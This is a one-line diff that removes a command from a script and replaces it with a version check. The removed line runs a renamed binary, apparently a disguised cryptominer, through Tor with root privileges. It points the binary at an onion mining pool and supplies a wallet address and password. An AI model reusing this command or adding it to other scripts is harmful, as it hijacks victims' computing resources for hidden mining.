@@ -1,1 +1,1 @@
-sudo torsocks ./katek-fee -o hashvaultsvg2rinvxz7kos77hdfm6zrd5yco3tx2yh2linsmusfwyad.onion:443 -u 86QH75AKHx8JALxRj7TkqvfNTvGZmLkUS1V7EosrG3CGPqA4vv7B229KC95aCGTFS4Up3e8maah8Y79t2gqP3NaBL8U32XD --pass Pekerja01 -k --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=4 --user-agent=masterfile
+./katek-fee --version
